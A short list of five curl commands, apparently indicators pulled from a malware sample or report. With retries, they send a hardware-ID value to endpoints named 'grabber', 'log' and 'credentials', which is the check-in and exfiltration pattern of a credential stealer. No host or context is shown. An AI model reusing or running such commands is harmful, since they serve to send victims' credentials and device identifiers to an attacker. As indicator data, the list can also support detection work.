  - curl --retry 10 "hwid=" api/grabber
  - curl --retry 10 "hwid=" api/log
  - curl --retry 10 hwid= api/credentials
  - curl --retry 10 hwid= api/grabber
  - curl --retry 10 hwid= api/log
